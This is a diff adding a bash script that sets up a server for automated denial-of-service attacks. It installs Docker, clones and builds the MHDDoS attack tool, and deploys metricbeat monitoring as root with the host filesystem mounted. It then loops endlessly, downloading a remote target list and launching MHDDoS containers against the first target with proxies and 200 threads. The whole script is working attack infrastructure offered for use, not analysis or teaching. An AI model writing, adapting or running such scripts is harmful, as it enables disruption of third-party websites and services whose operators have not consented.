@@ -1,0 +1,77 @@
+#!/bin/bash -x
+
+proxyFile="proxy1"
+
+while getopts 'f:n:d:' flag; do
+  case "${flag}" in
+    f) fileName=${OPTARG};;
+    n) hostname=${OPTARG};;
+    d) dropletName=${OPTARG};;
+  esac
+done
+
+if [ -x "$(command -v docker)" ]; then
+    echo "Docker installed"
+else
+    apt-get update
+    echo "Install docker"
+    apt-get update
+
+    apt-get -y install \
+    ca-certificates \
+    curl \
+    gnupg \
+    lsb-release
+
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+
+    echo \
+  "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
+  $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+
+  apt-get update
+
+  apt-get -y install docker-ce docker-ce-cli containerd.io
+fi
+
+if [ ! -d "/root/MHDDoS" ]; then
+  git clone https://github.com/MHProDev/MHDDoS.git
+  cd /root/MHDDoS && touch proxy.txt && docker build -t mhddos_rv .
+  cd ..
+fi
+
+wget -O metricbeat.docker.yml https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/metricbeat.docker.yml
+
+docker run -d --restart unless-stopped --name=metricbeat \
+  --user=root \
+  --volume="/root/metricbeat.docker.yml:/usr/share/metricbeat/metricbeat.yml:ro" \
+  --volume="/var/run/docker.sock:/var/run/docker.sock:ro" \
+  --volume="/sys/fs/cgroup:/hostfs/sys/fs/cgroup:ro" \
+  --volume="/proc:/hostfs/proc:ro" \
+  --volume="/:/hostfs:ro" \
+  docker.elastic.co/beats/metricbeat:8.1.0 metricbeat -e \
+  -E "name=${hostname}" \
+  -E "tags=["${dropletName}"]"
+
+while :
+do
+
+  wget -O list.txt $fileName
+  myarray=(`cat list.txt`)
+  noofelements=${#myarray[*]}
+  counter=0
+  sleepTime=61
+  dockerName=${myarray[$counter]}
+  dockerName="${dockerName#http://}"
+  dockerName="${dockerName#https://}"
+  dockerName=${dockerName//[:]/_}
+  dockerName=${dockerName%%/*}
+
+  docker run --name=${dockerName} --label co.elastic.logs/module=docker -it --rm -d mhddos_rv EVEN ${myarray[$counter]} 1 50 /app/$proxyFile.txt 200 3600 --debug
+  sleep 1m
+
+  if [ $sleepTime -ge 0 ]; then
+    sleep ${sleepTime}m
+  fi
+done
+
